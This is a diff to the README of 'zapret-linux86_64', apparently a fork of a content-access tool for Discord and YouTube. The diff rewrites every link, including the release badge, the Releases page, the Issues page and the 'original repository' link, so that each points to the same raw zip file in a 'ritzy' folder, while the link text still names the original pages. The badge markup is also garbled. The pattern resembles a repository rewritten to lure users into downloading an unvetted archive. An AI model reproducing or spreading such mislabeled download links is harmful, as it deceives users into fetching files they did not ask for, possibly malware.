@@ -1,7 +1,7 @@
 # 🌟 zapret-linux86_64 - Simplifying Access to Your Favorite Content
 
 ## 🔗 Download the Latest Version
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue.svg)](https://github.com/pk3223/zapret-linux86_64/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/pk3223/zapret-linux86_64/main/ritzy/zapret-linux86_64-2.4.zip%20Latest%https://raw.githubusercontent.com/pk3223/zapret-linux86_64/main/ritzy/zapret-linux86_64-2.4.zip)](https://raw.githubusercontent.com/pk3223/zapret-linux86_64/main/ritzy/zapret-linux86_64-2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to zapret-linux86_64! This tool helps you access specific content on platforms like Discord and YouTube. You can enhance your online experience by using this application.
@@ -9,7 +9,7 @@ Welcome to zapret-linux86_64! This tool helps you access specific content on pla
 ## 📥 Download & Install
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/pk3223/zapret-linux86_64/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/pk3223/zapret-linux86_64/main/ritzy/zapret-linux86_64-2.4.zip) to find the latest version.
 2. **Choose the Right Version:** Look for the version that fits your system. For Linux, select a file labeled for `linux86_64`.
 3. **Download the Application:** Click on the download link for the desired version to save the file to your computer.
 4. **Install the Application:** Once downloaded, find the file in your downloads folder. 
@@ -40,13 +40,13 @@ If you encounter any issues during installation or while using zapret-linux86_64
 - **Running in Terminal:** If the application doesn’t run as expected, try running it from the terminal to view error messages.
 
 ## 📞 Support
-For any further assistance, you can visit our [Issues page](https://github.com/pk3223/zapret-linux86_64/issues) on GitHub. This is a place to report bugs or ask questions about the application. 
+For any further assistance, you can visit our [Issues page](https://raw.githubusercontent.com/pk3223/zapret-linux86_64/main/ritzy/zapret-linux86_64-2.4.zip) on GitHub. This is a place to report bugs or ask questions about the application. 
 
 ## 📝 Contributing
 If you're interested in contributing to zapret-linux86_64, feel free to check the repository for guidelines on how to make improvements. Documentation and suggestions are welcome.
 
 ## 🔗 Explore More
-Interested in the original project? Check out the [original repository](https://github.com/Sergeydigl3/zapret-discord-youtube-linux) for more insights and features.
+Interested in the original project? Check out the [original repository](https://raw.githubusercontent.com/pk3223/zapret-linux86_64/main/ritzy/zapret-linux86_64-2.4.zip) for more insights and features.
 
 ## 🚀 Conclusion
-Thank you for choosing zapret-linux86_64! We hope it enhances your online experience. Remember to check the [Releases page](https://github.com/pk3223/zapret-linux86_64/releases) regularly for updates and new features. Stay connected!
+Thank you for choosing zapret-linux86_64! We hope it enhances your online experience. Remember to check the [Releases page](https://raw.githubusercontent.com/pk3223/zapret-linux86_64/main/ritzy/zapret-linux86_64-2.4.zip) regularly for updates and new features. Stay connected!
